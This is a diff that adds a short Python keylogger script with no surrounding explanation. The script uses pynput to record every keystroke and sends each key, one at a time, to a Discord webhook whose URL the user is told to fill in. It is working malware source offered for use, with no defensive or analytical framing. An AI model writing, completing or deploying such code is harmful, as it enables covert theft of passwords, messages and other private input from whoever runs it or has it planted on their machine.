@@ -1,0 +1,16 @@
+from pynput.keyboard import Key, Listener
+from dhooks import Webhook
+import logging
+
+log_dir = ''
+
+log_send = Webhook('') #place you discord webhook
+
+def on_press(key):
+    logging.info(str(key))
+    print(key)
+    log_send.send(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+    
